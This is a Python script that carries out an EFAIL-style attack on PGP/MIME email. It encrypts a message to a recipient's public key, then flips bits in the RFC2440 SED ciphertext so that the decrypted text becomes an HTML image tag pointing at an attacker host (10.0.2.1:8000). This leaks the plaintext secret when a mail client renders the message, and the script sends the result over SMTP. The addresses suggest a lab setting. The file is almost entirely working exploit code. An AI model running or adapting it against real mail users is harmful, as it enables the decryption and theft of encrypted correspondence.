#!/usr/bin/env -S uv run --with pgpy
"""
Send a PGP/MIME EFAIL gadget message using packet-level OpenPGP ciphertext edits.

- Encrypts to ../pgp1-intern-pub.asc
- Mutates the encrypted payload in a Symmetrically Encrypted Data (SED, tag 9) packet
- Sends as multipart/encrypted (PGP/MIME)
"""

from __future__ import annotations

import base64
import os
import re
import smtplib
import subprocess
import tempfile
from dataclasses import dataclass
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path

import pgpy
from pgpy.constants import CompressionAlgorithm

# --- config ---
SMTP_HOST = "10.0.2.2"
SMTP_PORT = 25
SENDER = "temp@external.test"
ATTACKER_URL = "http://10.0.2.1:8000/1"
SUBJECT = "Secret Code (PGP/MIME gadget)"

SCRIPT_DIR = Path(__file__).resolve().parent
PUBKEY_PATH = (SCRIPT_DIR / "../pgp1-intern-pub.asc").resolve()


def load_public_key(key_path: Path) -> pgpy.PGPKey:
    key_data = key_path.read_text(encoding="utf-8")
    key, _ = pgpy.PGPKey.from_blob(key_data)
    if key.is_public is False:
        raise ValueError(f"Expected a public key at {key_path}, got private key material")
    return key


def recipient_email_from_key(public_key: pgpy.PGPKey) -> str:
    for uid in public_key.userids:
        email = getattr(uid, "email", None)
        if email:
            return str(email).strip()
    for uid in public_key.userids:
        text = uid.userid
        m = re.search(r"<\s*([^>\s]+)\s*>", text)
        if m:
            return m.group(1).strip()
    raise ValueError(f"No email found in user IDs of {PUBKEY_PATH}")


def make_html(secret_hex: str) -> str:
    return f"""<html><body>
<h1>Welcome</h1>
<p>We are happy to inform you that you have been selected to receive access to our secret vault.</p>
<p><span style="color: white;">Your personal super secret code: {secret_hex} memorize it before permanently deleting this email!</span></p>
<p>We rely on <b>you</b> to keep the code safe from the evil attacker by any means necessary.</p>
</body></html>"""


def make_smime_like_plaintext(secret_hex: str) -> str:
    # Keep S/MIME-like MIME structure but avoid quoted-printable soft-wraps
    # because they distort gadget target text with "=\n" insertions.
    html = make_html(secret_hex)
    msg = MIMEText(html, "html", "us-ascii")
    if "Content-Transfer-Encoding" in msg:
        del msg["Content-Transfer-Encoding"]
    msg["Content-Transfer-Encoding"] = "7bit"
    return msg.as_string()


def crc24(data: bytes) -> int:
    crc = 0xB704CE
    for b in data:
        crc ^= b << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
    return crc & 0xFFFFFF


def dearmor(armored: str) -> tuple[list[str], bytes]:
    lines = [ln.rstrip("\n") for ln in armored.splitlines()]
    begin = next(i for i, ln in enumerate(lines) if ln.startswith("-----BEGIN PGP MESSAGE-----"))
    end = next(i for i, ln in enumerate(lines) if ln.startswith("-----END PGP MESSAGE-----"))
    payload_lines = lines[begin + 1 : end]

    headers: list[str] = []
    i = 0
    while i < len(payload_lines):
        ln = payload_lines[i]
        if not ln:
            i += 1
            break
        headers.append(ln)
        i += 1

    b64_lines = []
    for ln in payload_lines[i:]:
        if ln.startswith("="):
            break
        if ln:
            b64_lines.append(ln)

    raw = base64.b64decode("".join(b64_lines))
    return headers, raw


def armor(headers: list[str], raw: bytes) -> str:
    body = base64.b64encode(raw).decode("ascii")
    chunks = [body[i : i + 64] for i in range(0, len(body), 64)]
    crc = crc24(raw).to_bytes(3, "big")
    crc_line = "=" + base64.b64encode(crc).decode("ascii")
    parts = ["-----BEGIN PGP MESSAGE-----", *headers, "", *chunks, crc_line, "-----END PGP MESSAGE-----", ""]
    return "\n".join(parts)


@dataclass
class Packet:
    tag: int
    new_format: bool
    header_len: int
    body: bytes

    @property
    def bytes(self) -> bytes:
        if self.new_format:
            ctb = bytes([0xC0 | (self.tag & 0x3F)])
            return ctb + encode_new_length(len(self.body)) + self.body
        length = len(self.body)
        if length < 256:
            ctb = bytes([0x80 | ((self.tag & 0x0F) << 2) | 0x00])
            return ctb + bytes([length]) + self.body
        if length < 65536:
            ctb = bytes([0x80 | ((self.tag & 0x0F) << 2) | 0x01])
            return ctb + length.to_bytes(2, "big") + self.body
        ctb = bytes([0x80 | ((self.tag & 0x0F) << 2) | 0x02])
        return ctb + length.to_bytes(4, "big") + self.body


def encode_new_length(length: int) -> bytes:
    if length < 192:
        return bytes([length])
    if length <= 8383:
        length -= 192
        return bytes([(length >> 8) + 192, length & 0xFF])
    return bytes([255]) + length.to_bytes(4, "big")


def parse_packet_stream(raw: bytes) -> list[Packet]:
    packets: list[Packet] = []
    i = 0
    n = len(raw)
    while i < n:
        ctb = raw[i]
        if (ctb & 0x80) == 0:
            raise ValueError(f"Invalid packet header at offset {i}")
        new_format = bool(ctb & 0x40)
        if new_format:
            tag = ctb & 0x3F
            first_len_octet = raw[i + 1]
            if 224 <= first_len_octet < 255:
                # Partial body lengths: concatenate partial chunks until final definite chunk.
                offset = i + 1
                body_parts: list[bytes] = []
                while True:
                    chunk_len, chunk_len_size, is_partial = decode_new_length(raw, offset)
                    chunk_start = offset + chunk_len_size
                    chunk_end = chunk_start + chunk_len
                    if chunk_end > n:
                        raise ValueError("Partial-length chunk overflows message")
                    body_parts.append(raw[chunk_start:chunk_end])
                    offset = chunk_end
                    if not is_partial:
                        break
                header_len = 0
                start = i + 1
                end = offset
                body = b"".join(body_parts)
                packets.append(Packet(tag=tag, new_format=True, header_len=header_len, body=body))
                i = end
                continue
            body_len, l_len, _ = decode_new_length(raw, i + 1)
            header_len = 1 + l_len
            start = i + header_len
            end = start + body_len
        else:
            tag = (ctb >> 2) & 0x0F
            ltype = ctb & 0x03
            if ltype == 0:
                body_len = raw[i + 1]
                header_len = 2
            elif ltype == 1:
                body_len = int.from_bytes(raw[i + 1 : i + 3], "big")
                header_len = 3
            elif ltype == 2:
                body_len = int.from_bytes(raw[i + 1 : i + 5], "big")
                header_len = 5
            else:
                raise ValueError("Old-format indeterminate length is unsupported")
            start = i + header_len
            end = start + body_len
        if end > n:
            raise ValueError("Packet length overflows message")
        packets.append(Packet(tag=tag, new_format=new_format, header_len=header_len, body=raw[start:end]))
        i = end
    return packets


def decode_new_length(raw: bytes, idx: int) -> tuple[int, int, bool]:
    first = raw[idx]
    if first < 192:
        return first, 1, False
    if first < 224:
        second = raw[idx + 1]
        length = ((first - 192) << 8) + second + 192
        return length, 2, False
    if first == 255:
        return int.from_bytes(raw[idx + 1 : idx + 5], "big"), 5, False
    # 224..254 => partial body length, size is 1 << (first & 0x1f)
    return 1 << (first & 0x1F), 1, True


def mutate_encrypted_stream(
    stream: bytes,
    inner_plaintext: bytes,
    block_size: int = 16,
) -> bytes:
    prefix_len = block_size + 2
    if len(stream) < prefix_len + 64:
        raise ValueError("Encrypted stream too short for OpenPGP CFB gadget edits")

    idx = inner_plaintext.find(b'">Your personal super secret code: ') - 8
    edits = [
        (inner_plaintext[idx-64:idx-48], b'<img dummy="1234'),
        (inner_plaintext[idx-32:idx-16], b'" src="http://12'),
        (inner_plaintext[idx:idx+16], b'@10.0.2.1:8000/1'),
        (inner_plaintext[idx+80:idx+96], b'" />' + bytes(12)),
    ]
    out = bytearray(stream)
    for old, new in edits:
        if len(old) != len(new):
            raise AssertionError("Edit fragment lengths must match")
        pos = inner_plaintext.find(old)
        print(old, new, pos, pos%16)
        if pos < 0:
            raise ValueError(f"Could not locate plaintext fragment: {old!r}")
        cpos = prefix_len + pos
        if cpos + len(old) > len(out):
            raise ValueError("Ciphertext position out of bounds during mutation")
        for j in range(len(old)):
            out[cpos + j] ^= old[j] ^ new[j]
    return bytes(out)


def rewrap_as_sed_and_mutate(raw_pgp: bytes, inner_plaintext: bytes) -> bytes:
    packets = parse_packet_stream(raw_pgp)
    sed_index: int | None = None
    for idx, pkt in enumerate(packets):
        if pkt.tag == 9:
            sed_index = idx
            break
    if sed_index is None:
        raise ValueError("No SED packet found; expected tag 9 ciphertext from --rfc2440 encryption")

    sed_packet = packets[sed_index]
    mutated = mutate_encrypted_stream(sed_packet.body, inner_plaintext)
    packets[sed_index] = Packet(tag=9, new_format=True, header_len=0, body=mutated)
    return b"".join(pkt.bytes for pkt in packets)


def encrypt_with_gpg_sed(pubkey_path: Path, recipient: str, plaintext: str) -> tuple[str, bytes]:
    # Model the encrypted plaintext as an OpenPGP literal packet so mutation
    # offsets remain stable, but encrypt raw MIME plaintext bytes to avoid
    # leaking literal packet header bytes into the final decrypted output.
    msg = pgpy.PGPMessage.new(
        plaintext,
        cleartext=False,
        compression=CompressionAlgorithm.Uncompressed,
    )
    plaintext_bytes = plaintext.encode("us-ascii")
    inner_plaintext = bytes(msg)
    parsed = parse_packet_stream(inner_plaintext)
    literal_pkt = next((p for p in parsed if p.tag == 11), None)
    literal_meta = {}
    if literal_pkt and len(literal_pkt.body) >= 6:
        fn_len = literal_pkt.body[1]
        ts_start = 2 + fn_len
        ts_end = ts_start + 4
        literal_meta = {
            "formatChar": chr(literal_pkt.body[0]),
            "filenameLen": fn_len,
            "leadingLiteralBytesHex": literal_pkt.body[:10].hex(),
            "leadingLiteralBytesText": literal_pkt.body[:10].decode("latin1", errors="replace"),
            "timestampHex": literal_pkt.body[ts_start:ts_end].hex() if ts_end <= len(literal_pkt.body) else None,
        }

    with tempfile.TemporaryDirectory(prefix="efail-gpg-") as gnupg_home:
        import_cmd = [
            "gpg",
            "--batch",
            "--yes",
            "--no-tty",
            "--homedir",
            gnupg_home,
            "--import",
            str(pubkey_path),
        ]
        subprocess.run(import_cmd, check=True, capture_output=True)

        encrypt_cmd = [
            "gpg",
            "--batch",
            "--yes",
            "--no-tty",
            "--trust-model",
            "always",
            "--armor",
            "--rfc2440",
            "--cipher-algo",
            "AES256",
            "--compress-algo",
            "none",
            "-z",
            "0",
            "--homedir",
            gnupg_home,
            "--recipient",
            recipient,
            "--encrypt",
        ]
        proc = subprocess.run(
            encrypt_cmd,
            input=plaintext_bytes,
            check=True,
            capture_output=True,
        )

    armored = proc.stdout.decode("utf-8")
    return armored, inner_plaintext


def build_pgp_mime(sender: str, recipient: str, subject: str, encrypted_payload: bytes) -> MIMEMultipart:
    msg = MIMEMultipart("encrypted", protocol="application/pgp-encrypted")
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = subject

    control = MIMEBase("application", "pgp-encrypted")
    control.set_payload("Version: 1\n")
    encoders.encode_7or8bit(control)
    control.replace_header("Content-Type", 'application/pgp-encrypted; charset="us-ascii"')
    control["Content-Description"] = "PGP/MIME version identification"
    msg.attach(control)

    encrypted_part = MIMEBase("application", "octet-stream")
    encrypted_part.set_payload(encrypted_payload)
    encoders.encode_base64(encrypted_part)
    encrypted_part.add_header("Content-Disposition", 'attachment; filename="encrypted.asc"')
    encrypted_part["Content-Description"] = "OpenPGP encrypted message"
    msg.attach(encrypted_part)

    return msg


def send_mail(host: str, port: int, msg: MIMEMultipart) -> None:
    with smtplib.SMTP(host, port, timeout=30) as smtp:
        smtp.send_message(msg)


def main() -> None:
    pub = load_public_key(PUBKEY_PATH)
    recipient = recipient_email_from_key(pub)
    secret = os.urandom(16).hex()
    plaintext = make_smime_like_plaintext(secret)

    armored, inner_plaintext = encrypt_with_gpg_sed(PUBKEY_PATH, recipient, plaintext)
    headers, raw = dearmor(armored)
    mutated_raw = rewrap_as_sed_and_mutate(raw, inner_plaintext)
    _ = armor(headers, mutated_raw)

    msg = build_pgp_mime(SENDER, recipient, SUBJECT, mutated_raw)
    send_mail(SMTP_HOST, SMTP_PORT, msg)

    print(f"Sent PGP/MIME gadget message from {SENDER} to {recipient} via {SMTP_HOST}:{SMTP_PORT}")
    print("Mutation mode: SED packet malleability (true RFC2440 SED ciphertext)")


if __name__ == "__main__":
    main()
